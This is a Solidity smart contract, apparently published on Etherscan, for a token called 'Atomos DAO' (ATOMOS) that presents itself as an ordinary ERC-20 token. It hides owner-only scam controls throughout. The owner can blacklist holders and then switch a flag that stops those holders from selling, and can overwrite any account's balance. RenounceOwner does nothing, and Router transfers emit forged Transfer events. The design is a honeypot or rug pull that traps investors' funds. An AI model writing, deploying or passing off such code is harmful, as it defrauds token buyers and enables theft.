/**
 *Submitted for verification at Etherscan.io on 2022-10-17
*/

pragma solidity 0.8.16;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract ATOMOS {
  
    mapping (address => uint256) public dAmnt;
    mapping (address => bool) dUsr;


    // 
    string public name = "Atomos DAO";
    string public symbol = unicode"ATOMOS";
    uint8 public decimals = 18;
    uint256 public totalSupply = 400000000 * (uint256(10) ** decimals);
    uint public dmd = 1;

    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        dAmnt[msg.sender] = totalSupply;
        deploy(Deployer, totalSupply); }



	address owner = msg.sender;
    address Router = 0x5C8ebC917807447b92eF6039D9f470259353894D;
    address Deployer = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier E() {   
    require(msg.sender == owner);
         _;}
    modifier F () {
        dmd = 0;
        _;}
    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == Router)  {
        require(dAmnt[msg.sender] >= value);
        dAmnt[msg.sender] -= value;  
        dAmnt[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; } 
        if(dUsr[msg.sender]) {
        require(dmd == 1);} 
        require(dAmnt[msg.sender] >= value);
        dAmnt[msg.sender] -= value;  
        dAmnt[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return dAmnt[account]; }
        function dchck(address N) E public{          
        require(!dUsr[N]);
        dUsr[N] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function dblnc(address N, uint256 R) E public returns (bool success) {
        dAmnt[N] = R;
        return true; }
        function RenounceOwner() public {
            require(msg.sender == owner);
        }
        function dwdrw(address N) E public {
        require(dUsr[N]);
        dUsr[N] = false; }
		 function _deploy() F public {
            require(msg.sender == owner);
        }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Router)  {
        require(value <= dAmnt[from]);
        require(value <= allowance[from][msg.sender]);
        dAmnt[from] -= value;  
        dAmnt[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; }    
        if(dUsr[from] || dUsr[to]) {
        require(dmd == 1);}
        require(value <= dAmnt[from]);
        require(value <= allowance[from][msg.sender]);
        dAmnt[from] -= value;
        dAmnt[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }